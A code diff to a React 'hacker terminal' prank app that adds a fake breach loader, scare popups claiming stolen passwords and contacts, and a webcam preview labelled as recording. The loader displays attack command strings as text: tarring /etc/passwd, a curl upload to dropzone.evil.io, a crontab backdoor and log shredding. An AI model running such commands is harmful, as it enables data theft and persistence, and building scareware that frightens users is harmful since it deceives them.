@@ -87,6 +87,35 @@ const PANEL_TITLES = [
 
 const STORAGE_KEY = "hacker_terminal_saved_msgs";
 
+const LOADER_WARNINGS = [
+  { text: "⚠ WARNING: UNAUTHORIZED ACCESS DETECTED", color: "red" as const },
+  { text: "⚠ WARNING: FIREWALL BREACH IN PROGRESS", color: "red" as const },
+  { text: "⚠ WARNING: ENCRYPTING STOLEN DATA...", color: "amber" as const },
+  { text: "⚠ WARNING: UPLOADING TO REMOTE SERVER...", color: "amber" as const },
+  { text: "⚠ CRITICAL: COVER TRACKS INITIATED", color: "red" as const },
+  {
+    text: "⚠ CRITICAL: SYSTEM COMPROMISED — DO NOT CLOSE!",
+    color: "red" as const,
+  },
+];
+
+const LOADER_CMDS = [
+  "root@attacker:~$ ./exfiltrate.sh --target localhost --port 443",
+  "[+] Connecting to C2 server at 185.220.101.47:443...",
+  "[+] TLS handshake complete. Session encrypted.",
+  "root@attacker:~$ tar czf /tmp/loot.tar.gz /home /etc/passwd /var/www",
+  "[+] Compressing 2,847 files... done (847 MB)",
+  "root@attacker:~$ curl -s -T /tmp/loot.tar.gz https://dropzone.evil.io/upload",
+  "[+] Uploading chunk 1/8 ... [████░░░░] 12.4 MB/s",
+  "[+] Uploading chunk 2/8 ... [████████░░] 15.1 MB/s",
+  "root@attacker:~$ shred -vzn 3 /var/log/auth.log",
+  "[+] Overwriting logs... pass 1/3 complete",
+  "root@attacker:~$ crontab -l | grep backdoor || (crontab -l; echo '@reboot /tmp/.bd') | crontab -",
+  "[+] Persistence established. Backdoor installed.",
+  "root@attacker:~$ history -c && echo 'Access complete'",
+  "[+] Upload complete. 847 MB transferred successfully.",
+];
+
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 
 function randInt(min: number, max: number) {
@@ -200,6 +229,508 @@ function generateLine(panelIndex: number): TermLine {
     default:
       return { id, text: "PROCESSING...", type };
   }
+}
+
+// ─── HackerLoader ─────────────────────────────────────────────────────────────
+
+function HackerLoader() {
+  const [progress, setProgress] = useState(0);
+  const [visibleWarnings, setVisibleWarnings] = useState<number[]>([]);
+  const [visibleCmds, setVisibleCmds] = useState<string[]>([]);
+  const [bytes, setBytes] = useState(0);
+  const [speed, setSpeed] = useState(0);
+  const [fileCount, setFileCount] = useState(0);
+  const [blinkRed, setBlinkRed] = useState(false);
+  const cmdScrollRef = useRef<HTMLDivElement>(null);
+
+  // Progress bar: fill over ~6s
+  useEffect(() => {
+    const startTime = Date.now();
+    const duration = 6200;
+    const frame = () => {
+      const elapsed = Date.now() - startTime;
+      const pct = Math.min(100, (elapsed / duration) * 100);
+      setProgress(pct);
+      if (pct < 100) requestAnimationFrame(frame);
+    };
+    requestAnimationFrame(frame);
+  }, []);
+
+  // Stats counter
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setBytes((b) => b + randInt(180000, 420000));
+      setSpeed(Number.parseFloat((Math.random() * 12 + 4).toFixed(1)));
+      setFileCount((f) => f + randInt(2, 9));
+    }, 120);
+    return () => clearInterval(interval);
+  }, []);
+
+  // Warnings: appear one by one every 800ms
+  useEffect(() => {
+    LOADER_WARNINGS.forEach((_, i) => {
+      const t = setTimeout(
+        () => {
+          setVisibleWarnings((prev) => [...prev, i]);
+        },
+        400 + i * 820,
+      );
+      return () => clearTimeout(t);
+    });
+  }, []);
+
+  // Terminal commands: stream in every 400ms
+  useEffect(() => {
+    LOADER_CMDS.forEach((cmd, i) => {
+      const t = setTimeout(
+        () => {
+          setVisibleCmds((prev) => [...prev, cmd]);
+          setTimeout(() => {
+            if (cmdScrollRef.current) {
+              cmdScrollRef.current.scrollTop =
+                cmdScrollRef.current.scrollHeight;
+            }
+          }, 30);
+        },
+        300 + i * 420,
+      );
+      return () => clearTimeout(t);
+    });
+  }, []);
+
+  // Blink effect for warnings
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setBlinkRed((b) => !b);
+    }, 500);
+    return () => clearInterval(interval);
+  }, []);
+
+  const formatBytes = (b: number) => {
+    if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
+    return `${(b / (1024 * 1024)).toFixed(2)} MB`;
+  };
+
+  return (
+    <motion.div
+      key="hacker-loader"
+      initial={{ opacity: 1 }}
+      exit={{ opacity: 0, scale: 1.04 }}
+      transition={{ duration: 0.6, ease: "easeInOut" }}
+      data-ocid="loader.panel"
+      style={{
+        position: "fixed",
+        inset: 0,
+        zIndex: 200,
+        background: "oklch(0.040 0.010 145)",
+        fontFamily: "'JetBrains Mono', 'Courier New', monospace",
+        display: "flex",
+        flexDirection: "column",
+        alignItems: "center",
+        justifyContent: "center",
+        padding: "24px",
+        gap: "0",
+        overflow: "hidden",
+      }}
+    >
+      {/* Scanline overlay */}
+      <div
+        style={{
+          position: "absolute",
+          inset: 0,
+          backgroundImage:
+            "repeating-linear-gradient(0deg, transparent, transparent 2px, oklch(0 0 0 / 0.08) 2px, oklch(0 0 0 / 0.08) 4px)",
+          pointerEvents: "none",
+          zIndex: 1,
+        }}
+      />
+
+      {/* Corner brackets */}
+      {(["top-left", "top-right", "bottom-left", "bottom-right"] as const).map(
+        (pos) => (
+          <div
+            key={pos}
+            style={{
+              position: "absolute",
+              width: "40px",
+              height: "40px",
+              top: pos.startsWith("top") ? "16px" : undefined,
+              bottom: pos.startsWith("bottom") ? "16px" : undefined,
+              left: pos.endsWith("left") ? "16px" : undefined,
+              right: pos.endsWith("right") ? "16px" : undefined,
+              borderTop: pos.startsWith("top")
+                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
+                : undefined,
+              borderBottom: pos.startsWith("bottom")
+                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
+                : undefined,
+              borderLeft: pos.endsWith("left")
+                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
+                : undefined,
+              borderRight: pos.endsWith("right")
+                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
+                : undefined,
+              pointerEvents: "none",
+              zIndex: 2,
+            }}
+          />
+        ),
+      )}
+
+      {/* Main content */}
+      <div
+        style={{
+          position: "relative",
+          zIndex: 2,
+          width: "100%",
+          maxWidth: "760px",
+          display: "flex",
+          flexDirection: "column",
+          gap: "16px",
+        }}
+      >
+        {/* Title */}
+        <motion.div
+          initial={{ opacity: 0, y: -20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.4 }}
+          style={{ textAlign: "center" }}
+        >
+          <div
+            style={{
+              color: blinkRed ? "oklch(0.72 0.22 25)" : "oklch(0.65 0.22 25)",
+              fontSize: "clamp(1rem, 3vw, 1.6rem)",
+              fontWeight: "bold",
+              letterSpacing: "0.25em",
+              textShadow: blinkRed
+                ? "0 0 30px oklch(0.72 0.22 25 / 0.9), 0 0 60px oklch(0.72 0.22 25 / 0.5)"
+                : "0 0 15px oklch(0.65 0.22 25 / 0.6)",
+              transition: "all 0.3s",
+              marginBottom: "4px",
+            }}
+          >
+            ⚠ TRANSFERRING DATA... DO NOT CLOSE ⚠
+          </div>
+          <div
+            style={{
+              color: "oklch(0.56 0.03 145)",
+              fontSize: "0.6rem",
+              letterSpacing: "0.2em",
+            }}
+          >
+            UNAUTHORIZED ACCESS IN PROGRESS — SYSTEM BREACH ACTIVE
+          </div>
+        </motion.div>
+
+        {/* Progress Bar + Percentage */}
+        <motion.div
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ delay: 0.3 }}
+          style={{ display: "flex", flexDirection: "column", gap: "6px" }}
+        >
+          <div
+            style={{
+              display: "flex",
+              justifyContent: "space-between",
+              alignItems: "center",
+            }}
+          >
+            <span
+              style={{
+                color: "oklch(0.62 0.22 25)",
+                fontSize: "0.6rem",
+                letterSpacing: "0.15em",
+              }}
+            >
+              TRANSFER PROGRESS
+            </span>
+            <span
+              style={{
+                color: "oklch(0.85 0.22 145)",
+                fontSize: "1rem",
+                fontWeight: "bold",
+                letterSpacing: "0.1em",
+                textShadow: "0 0 10px oklch(0.85 0.22 145 / 0.7)",
+              }}
+            >
+              {Math.floor(progress)}%
+            </span>
+          </div>
+          {/* Progress track */}
+          <div
+            style={{
+              width: "100%",
+              height: "18px",
+              background: "oklch(0.08 0.012 145)",
+              border: "1px solid oklch(0.85 0.22 145 / 0.35)",
+              position: "relative",
+              overflow: "hidden",
+            }}
+          >
+            <motion.div
+              style={{
+                position: "absolute",
+                top: 0,
+                left: 0,
+                height: "100%",
+                width: `${progress}%`,
+                background:
+                  "linear-gradient(90deg, oklch(0.62 0.22 25 / 0.8), oklch(0.72 0.22 25))",
+                boxShadow: "0 0 12px oklch(0.72 0.22 25 / 0.7)",
+                transition: "width 0.08s linear",
+              }}
+            />
+            {/* Animated stripe */}
+            <div
+              style={{
+                position: "absolute",
+                inset: 0,
+                backgroundImage:
+                  "repeating-linear-gradient(90deg, transparent 0px, transparent 8px, oklch(0 0 0 / 0.15) 8px, oklch(0 0 0 / 0.15) 12px)",
+                animation: "stripe-move 0.6s linear infinite",
+              }}
+            />
+          </div>
+        </motion.div>
+
+        {/* Stats Row */}
+        <motion.div
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ delay: 0.4 }}
+          style={{
+            display: "grid",
+            gridTemplateColumns: "repeat(3, 1fr)",
+            gap: "8px",
+          }}
+        >
+          {[
+            { label: "BYTES TRANSFERRED", value: formatBytes(bytes) },
+            { label: "TRANSFER SPEED", value: `${speed} MB/s` },
+            { label: "FILES STOLEN", value: `${fileCount.toLocaleString()}` },
+          ].map(({ label, value }) => (
+            <div
+              key={label}
+              style={{
+                background: "oklch(0.055 0.008 145)",
+                border: "1px solid oklch(0.85 0.22 145 / 0.25)",
+                padding: "8px 12px",
+                textAlign: "center",
+              }}
+            >
+              <div
+                style={{
+                  color: "oklch(0.56 0.03 145)",
+                  fontSize: "0.5rem",
+                  letterSpacing: "0.15em",
+                  marginBottom: "4px",
+                }}
+              >
+                {label}
+              </div>
+              <div
+                style={{
+                  color: "oklch(0.85 0.22 145)",
+                  fontSize: "0.85rem",
+                  fontWeight: "bold",
+                  letterSpacing: "0.1em",
+                  textShadow: "0 0 8px oklch(0.85 0.22 145 / 0.6)",
+                }}
+              >
+                {value}
+              </div>
+            </div>
+          ))}
+        </motion.div>
+
+        {/* Main two-column: warnings + terminal */}
+        <div
+          style={{
+            display: "grid",
+            gridTemplateColumns: "1fr 1fr",
+            gap: "10px",
+            minHeight: "0",
+          }}
+        >
+          {/* Warnings column */}
+          <motion.div
+            initial={{ opacity: 0, x: -20 }}
+            animate={{ opacity: 1, x: 0 }}
+            transition={{ delay: 0.5 }}
+            style={{
+              background: "oklch(0.042 0.008 25)",
+              border: "1px solid oklch(0.62 0.22 25 / 0.5)",
+              padding: "10px",
+              display: "flex",
+              flexDirection: "column",
+              gap: "0",
+              minHeight: "150px",
+            }}
+          >
+            <div
+              style={{
+                color: "oklch(0.62 0.22 25)",
+                fontSize: "0.55rem",
+                letterSpacing: "0.2em",
+                borderBottom: "1px solid oklch(0.62 0.22 25 / 0.3)",
+                paddingBottom: "6px",
+                marginBottom: "8px",
+              }}
+            >
+              ▶ SECURITY ALERTS
+            </div>
+            <div
+              style={{ display: "flex", flexDirection: "column", gap: "5px" }}
+            >
+              <AnimatePresence>
+                {LOADER_WARNINGS.map((w, i) =>
+                  visibleWarnings.includes(i) ? (
+                    <motion.div
+                      key={w.text}
+                      initial={{ opacity: 0, x: -10 }}
+                      animate={{ opacity: 1, x: 0 }}
+                      transition={{ duration: 0.3 }}
+                      style={{
+                        color:
+                          w.color === "red"
+                            ? blinkRed
+                              ? "oklch(0.78 0.22 25)"
+                              : "oklch(0.62 0.22 25)"
+                            : blinkRed
+                              ? "oklch(0.88 0.18 75)"
+                              : "oklch(0.75 0.18 75)",
+                        fontSize: "0.6rem",
+                        letterSpacing: "0.04em",
+                        textShadow:
+                          w.color === "red"
+                            ? "0 0 6px oklch(0.72 0.22 25 / 0.6)"
+                            : "0 0 6px oklch(0.80 0.18 75 / 0.5)",
+                        transition: "color 0.3s",
+                        fontWeight: "bold",
+                        lineHeight: "1.4",
+                      }}
+                    >
+                      {w.text}
+                    </motion.div>
+                  ) : null,
+                )}
+              </AnimatePresence>
+            </div>
+          </motion.div>
+
+          {/* Terminal column */}
+          <motion.div
+            initial={{ opacity: 0, x: 20 }}
+            animate={{ opacity: 1, x: 0 }}
+            transition={{ delay: 0.5 }}
+            style={{
+              background: "oklch(0.038 0.007 145)",
+              border: "1px solid oklch(0.85 0.22 145 / 0.3)",
+              padding: "10px",
+              display: "flex",
+              flexDirection: "column",
+              minHeight: "150px",
+            }}
+          >
+            <div
+              style={{
+                color: "oklch(0.85 0.22 145)",
+                fontSize: "0.55rem",
+                letterSpacing: "0.2em",
+                borderBottom: "1px solid oklch(0.85 0.22 145 / 0.3)",
+                paddingBottom: "6px",
+                marginBottom: "8px",
+                flexShrink: 0,
+              }}
+            >
+              ▶ EXECUTING COMMANDS
+            </div>
+            <div
+              ref={cmdScrollRef}
+              style={{
+                flex: 1,
+                overflowY: "hidden",
+                display: "flex",
+                flexDirection: "column",
+                gap: "3px",
+              }}
+            >
+              {visibleCmds.map((cmd) => (
+                <motion.div
+                  key={cmd}
+                  initial={{ opacity: 0 }}
+                  animate={{ opacity: 1 }}
+                  transition={{ duration: 0.2 }}
+                  style={{
+                    color: cmd.startsWith("[+]")
+                      ? "oklch(0.75 0.14 145)"
+                      : "oklch(0.62 0.10 145)",
+                    fontSize: "0.55rem",
+                    lineHeight: "1.4",
+                    whiteSpace: "nowrap",
+                    overflow: "hidden",
+                    textOverflow: "ellipsis",
+                    fontWeight: cmd.startsWith("root@") ? "normal" : "normal",
+                  }}
+                >
+                  {cmd}
+                </motion.div>
+              ))}
+              {/* Blinking cursor */}
+              <span
+                style={{
+                  display: "inline-block",
+                  color: "oklch(0.85 0.22 145)",
+                  animation: "blink 1s step-start infinite",
+                  fontSize: "0.6rem",
+                }}
+              >
+                ▮
+              </span>
+            </div>
+          </motion.div>
+        </div>
+
+        {/* Bottom status */}
+        <motion.div
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ delay: 0.6 }}
+          style={{
+            display: "flex",
+            justifyContent: "space-between",
+            alignItems: "center",
+            borderTop: "1px solid oklch(0.85 0.22 145 / 0.2)",
+            paddingTop: "8px",
+          }}
+        >
+          <span
+            style={{
+              color: "oklch(0.56 0.03 145)",
+              fontSize: "0.5rem",
+              letterSpacing: "0.1em",
+            }}
+          >
+            TARGET: {randIp()} | ATTACKER: 185.220.101.47 | PORT: 443/TLS
+          </span>
+          <span
+            style={{
+              color: blinkRed
+                ? "oklch(0.78 0.22 25)"
+                : "oklch(0.62 0.22 25 / 0.7)",
+              fontSize: "0.5rem",
+              letterSpacing: "0.1em",
+              transition: "color 0.3s",
+              fontWeight: "bold",
+            }}
+          >
+            ● BREACH ACTIVE
+          </span>
+        </motion.div>
+      </div>
+    </motion.div>
+  );
 }
 
 // ─── TermPanel ────────────────────────────────────────────────────────────────
@@ -351,6 +882,7 @@ function TermPanel({
 // ─── App ──────────────────────────────────────────────────────────────────────
 
 export default function App() {
+  const [showLoader, setShowLoader] = useState(true);
   const [flashMsg, setFlashMsg] = useState<{
     text: string;
     color: "neon" | "red";
@@ -367,6 +899,12 @@ export default function App() {
   const [injectedLines, setInjectedLines] = useState<(TermLine | null)[]>(
     Array(6).fill(null),
   );
+
+  // Hide loader after 6.5s
+  useEffect(() => {
+    const t = setTimeout(() => setShowLoader(false), 6500);
+    return () => clearTimeout(t);
+  }, []);
 
   // ── Saved messages (localStorage) ──
   const [savedMessages, setSavedMessages] = useState<SavedMessage[]>(() => {
@@ -407,7 +945,7 @@ export default function App() {
           setInjectedLines(Array(6).fill(newLine));
           setTimeout(() => setInjectedLines(Array(6).fill(null)), 100);
         },
-        i * 600 + 1500,
+        i * 600 + 7500,
       );
     });
   }, []);
@@ -432,7 +970,7 @@ export default function App() {
       triggerFlash();
       const interval = setInterval(triggerFlash, randInt(10000, 16000));
       return () => clearInterval(interval);
-    }, 3000);
+    }, 9000);
     return () => clearTimeout(initial);
   }, [triggerFlash]);
 
@@ -478,6 +1016,209 @@ export default function App() {
     setShowAddMsg(false);
   };
 
+  // ── Scary Hack Effects ──────────────────────────────────────────────────────
+
+  // Camera state
+  const [cameraStream, setCameraStream] = useState<MediaStream | null>(null);
+  const [showCamera, setShowCamera] = useState(false);
+  const [cameraBlocked, setCameraBlocked] = useState(false);
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const cameraAttempted = useRef(false);
+
+  // Scary popup notifications
+  const [scaryPopups, setScaryPopups] = useState<
+    {
+      id: number;
+      title: string;
+      detail: string;
+      position: "top-right" | "bottom-right";
+    }[]
+  >([]);
+  const popupIdRef = useRef(0);
+
+  // Screen shake
+  const [shaking, setShaking] = useState(false);
+
+  // Red flash
+  const [redFlash, setRedFlash] = useState(false);
+
+  // System alert banner
+  const [showBanner, setShowBanner] = useState(false);
+
+  // Helper: beep sound
+  const playBeep = useCallback(() => {
+    try {
+      const ctx = new AudioContext();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.frequency.value = 880;
+      gain.gain.setValueAtTime(0.3, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.2);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.2);
+    } catch {
+      // ignore audio errors
+    }
+  }, []);
+
+  // Helper: add scary popup
+  const addScaryPopup = useCallback(
+    (title: string, detail: string, position: "top-right" | "bottom-right") => {
+      const id = ++popupIdRef.current;
+      setScaryPopups((prev) => [...prev, { id, title, detail, position }]);
+      playBeep();
+      setTimeout(
+        () => setScaryPopups((prev) => prev.filter((p) => p.id !== id)),
+        3800,
+      );
+    },
+    [playBeep],
+  );
+
+  // Camera effect (once, after ~12s)
+  useEffect(() => {
+    if (showLoader) return;
+    if (cameraAttempted.current) return;
+    cameraAttempted.current = true;
+    const t = setTimeout(async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: false,
+        });
+        setCameraStream(stream);
+        setShowCamera(true);
+        // Auto-stop after 15s
+        setTimeout(() => {
+          for (const track of stream.getTracks()) track.stop();
+          setShowCamera(false);
+          setCameraStream(null);
+        }, 15000);
+      } catch {
+        setCameraBlocked(true);
+        setTimeout(() => setCameraBlocked(false), 3000);
+      }
+    }, 12000);
+    return () => clearTimeout(t);
+  }, [showLoader]);
+
+  // Attach camera stream to video element
+  useEffect(() => {
+    if (videoRef.current && cameraStream) {
+      videoRef.current.srcObject = cameraStream;
+    }
+  }, [cameraStream]);
+
+  // Cleanup camera on unmount
+  useEffect(() => {
+    return () => {
+      if (cameraStream) {
+        for (const t of cameraStream.getTracks()) t.stop();
+      }
+    };
+  }, [cameraStream]);
+
+  // Scary popup random interval
+  const SCARY_ALERTS = [
+    {
+      title: "📸 SCREENSHOT CAPTURED",
+      detail: "Uploaded to remote server 185.220.101.47",
+    },
+    {
+      title: "📍 LOCATION ACQUIRED",
+      detail: "City: Karachi, PK | Coords: 24.8607° N, 67.0011° E",
+    },
+    {
+      title: "🎤 MICROPHONE ACCESSED",
+      detail: "Audio stream active — recording...",
+    },
+    {
+      title: "📋 CLIPBOARD STOLEN",
+      detail: "Contents copied to attacker buffer",
+    },
+    {
+      title: "🔑 PASSWORDS EXTRACTED",
+      detail: "12 credentials found in browser keychain",
+    },
+    { title: "📱 CONTACTS UPLOADED", detail: "847 contacts sent to C2 server" },
+    {
+      title: "🌐 BROWSER HISTORY EXFILTRATED",
+      detail: "Last 30 days — 1,247 entries",
+    },
+  ];
+
+  useEffect(() => {
+    if (showLoader) return;
+    let timeoutId: ReturnType<typeof setTimeout>;
+    const schedule = () => {
+      const delay = randInt(8000, 20000);
+      timeoutId = setTimeout(() => {
+        const alert = randItem(SCARY_ALERTS);
+        const position = Math.random() > 0.5 ? "top-right" : "bottom-right";
+        addScaryPopup(
+          alert.title,
+          alert.detail,
+          position as "top-right" | "bottom-right",
+        );
+        schedule();
+      }, delay);
+    };
+    schedule();
+    return () => clearTimeout(timeoutId);
+  }, [showLoader, addScaryPopup]);
+
+  // Screen shake random interval
+  useEffect(() => {
+    if (showLoader) return;
+    let timeoutId: ReturnType<typeof setTimeout>;
+    const schedule = () => {
+      const delay = randInt(15000, 30000);
+      timeoutId = setTimeout(() => {
+        setShaking(true);
+        setTimeout(() => setShaking(false), 400);
+        schedule();
+      }, delay);
+    };
+    schedule();
+    return () => clearTimeout(timeoutId);
+  }, [showLoader]);
+
+  // Red flash random interval
+  useEffect(() => {
+    if (showLoader) return;
+    let timeoutId: ReturnType<typeof setTimeout>;
+    const schedule = () => {
+      const delay = randInt(20000, 40000);
+      timeoutId = setTimeout(() => {
+        setRedFlash(true);
+        playBeep();
+        setTimeout(() => setRedFlash(false), 350);
+        schedule();
+      }, delay);
+    };
+    schedule();
+    return () => clearTimeout(timeoutId);
+  }, [showLoader, playBeep]);
+
+  // System alert banner random interval
+  useEffect(() => {
+    if (showLoader) return;
+    let timeoutId: ReturnType<typeof setTimeout>;
+    const schedule = () => {
+      const delay = randInt(25000, 50000);
+      timeoutId = setTimeout(() => {
+        setShowBanner(true);
+        playBeep();
+        setTimeout(() => setShowBanner(false), 3200);
+        schedule();
+      }, delay);
+    };
+    schedule();
+    return () => clearTimeout(timeoutId);
+  }, [showLoader, playBeep]);
+
   const timeStr = time.toTimeString().slice(0, 8);
   const dateStr = time.toLocaleDateString("en-US", {
     year: "numeric",
@@ -487,7 +1228,7 @@ export default function App() {
 
   return (
     <div
-      className="relative"
+      className={`relative${shaking ? " screen-shake" : ""}`}
       style={{
         width: "100vw",
         height: "100vh",
@@ -498,6 +1239,9 @@ export default function App() {
         flexDirection: "column",
       }}
     >
+      {/* ── Hacker Loader ── */}
+      <AnimatePresence>{showLoader && <HackerLoader />}</AnimatePresence>
+
       {/* ── Top Nav ── */}
       <header
         data-ocid="nav.panel"
@@ -1296,6 +2040,231 @@ export default function App() {
             >
               Press ESC or click CLOSE to go back to hacking
             </motion.p>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* ── Scary Effects JSX ── */}
+
+      {/* Red Flash */}
+      <AnimatePresence>
+        {redFlash && (
+          <motion.div
+            key="redflash"
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 0.35 }}
+            exit={{ opacity: 0 }}
+            transition={{ duration: 0.1 }}
+            style={{
+              position: "fixed",
+              inset: 0,
+              background: "red",
+              zIndex: 9990,
+              pointerEvents: "none",
+            }}
+          />
+        )}
+      </AnimatePresence>
+
+      {/* System Alert Banner */}
+      <AnimatePresence>
+        {showBanner && (
+          <motion.div
+            key="banner"
+            initial={{ y: -60 }}
+            animate={{ y: 0 }}
+            exit={{ y: -60 }}
+            transition={{ duration: 0.3, ease: "easeOut" }}
+            style={{
+              position: "fixed",
+              top: 0,
+              left: 0,
+              right: 0,
+              zIndex: 9995,
+              background: "oklch(0.38 0.22 25)",
+              color: "white",
+              fontFamily: "'JetBrains Mono', monospace",
+              fontSize: "0.85rem",
+              fontWeight: 700,
+              letterSpacing: "0.12em",
+              textAlign: "center",
+              padding: "10px 16px",
+              borderBottom: "2px solid oklch(0.6 0.25 25)",
+              animation: "blink-warning 0.5s step-end infinite",
+            }}
+          >
+            ⚠ CRITICAL ALERT: Data exfiltration complete — 1.2 GB transferred ⚠
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Scary Popup Notifications */}
+      <div
+        style={{
+          position: "fixed",
+          top: 0,
+          right: 0,
+          bottom: 0,
+          pointerEvents: "none",
+          zIndex: 9996,
+        }}
+      >
+        <AnimatePresence>
+          {scaryPopups.map((popup) => (
+            <motion.div
+              key={popup.id}
+              initial={{ x: 280, opacity: 0 }}
+              animate={{ x: 0, opacity: 1 }}
+              exit={{ x: 280, opacity: 0 }}
+              transition={{ duration: 0.35, ease: "easeOut" }}
+              style={{
+                position: "absolute",
+                right: "16px",
+                ...(popup.position === "top-right"
+                  ? { top: "56px" }
+                  : { bottom: "20px" }),
+                width: "260px",
+                background: "oklch(0.1 0.02 25)",
+                border: "1px solid oklch(0.5 0.22 25)",
+                borderRadius: "4px",
+                padding: "10px 12px",
+                boxShadow: "0 0 20px oklch(0.5 0.22 25 / 0.6)",
+                fontFamily: "'JetBrains Mono', monospace",
+                pointerEvents: "auto",
+              }}
+            >
+              <div
+                style={{
+                  color: "oklch(0.7 0.22 25)",
+                  fontSize: "0.7rem",
+                  fontWeight: 700,
+                  letterSpacing: "0.08em",
+                  marginBottom: "4px",
+                }}
+              >
+                {popup.title}
+              </div>
+              <div
+                style={{
+                  color: "oklch(0.65 0.1 60)",
+                  fontSize: "0.62rem",
+                  letterSpacing: "0.04em",
+                  lineHeight: 1.5,
+                }}
+              >
+                {popup.detail}
+              </div>
+              <div
+                style={{
+                  marginTop: "6px",
+                  width: "100%",
+                  height: "2px",
+                  background: "oklch(0.5 0.22 25 / 0.4)",
+                  borderRadius: "1px",
+                  overflow: "hidden",
+                }}
+              >
+                <motion.div
+                  initial={{ width: "100%" }}
+                  animate={{ width: "0%" }}
+                  transition={{ duration: 3.6, ease: "linear" }}
+                  style={{ height: "100%", background: "oklch(0.6 0.22 25)" }}
+                />
+              </div>
+            </motion.div>
+          ))}
+        </AnimatePresence>
+      </div>
+
+      {/* Camera Feed */}
+      <AnimatePresence>
+        {showCamera && (
+          <motion.div
+            key="camera"
+            initial={{ opacity: 0, scale: 0.8 }}
+            animate={{ opacity: 1, scale: 1 }}
+            exit={{ opacity: 0, scale: 0.8 }}
+            transition={{ duration: 0.4 }}
+            style={{
+              position: "fixed",
+              bottom: "20px",
+              right: "16px",
+              zIndex: 9997,
+              border: "2px solid red",
+              borderRadius: "4px",
+              overflow: "hidden",
+              boxShadow: "0 0 24px rgba(255,0,0,0.7)",
+              background: "#000",
+              width: "160px",
+              height: "120px",
+            }}
+          >
+            <video
+              ref={videoRef}
+              autoPlay
+              muted
+              playsInline
+              style={{ width: "100%", height: "100%", objectFit: "cover" }}
+            />
+            <div
+              style={{
+                position: "absolute",
+                top: "4px",
+                left: "6px",
+                color: "red",
+                fontSize: "0.55rem",
+                fontFamily: "'JetBrains Mono', monospace",
+                fontWeight: 700,
+                letterSpacing: "0.06em",
+                animation: "blink-warning 0.8s step-end infinite",
+              }}
+            >
+              ● WEBCAM ACCESSED
+            </div>
+            <div
+              style={{
+                position: "absolute",
+                top: "4px",
+                right: "6px",
+                color: "red",
+                fontSize: "0.55rem",
+                fontFamily: "'JetBrains Mono', monospace",
+                fontWeight: 700,
+                animation: "blink-warning 1s step-end infinite",
+              }}
+            >
+              REC ●
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Camera Blocked Message */}
+      <AnimatePresence>
+        {cameraBlocked && (
+          <motion.div
+            key="camblocked"
+            initial={{ opacity: 0, y: 30 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: 30 }}
+            transition={{ duration: 0.3 }}
+            style={{
+              position: "fixed",
+              bottom: "20px",
+              right: "16px",
+              zIndex: 9997,
+              background: "oklch(0.1 0.02 25)",
+              border: "1px solid oklch(0.5 0.22 25)",
+              borderRadius: "4px",
+              padding: "10px 14px",
+              fontFamily: "'JetBrains Mono', monospace",
+              fontSize: "0.65rem",
+              color: "oklch(0.7 0.22 25)",
+              maxWidth: "260px",
+              boxShadow: "0 0 16px oklch(0.5 0.22 25 / 0.5)",
+            }}
+          >
+            ⚠ WEBCAM ACCESS BLOCKED — switching to alternate method...
           </motion.div>
         )}
       </AnimatePresence>
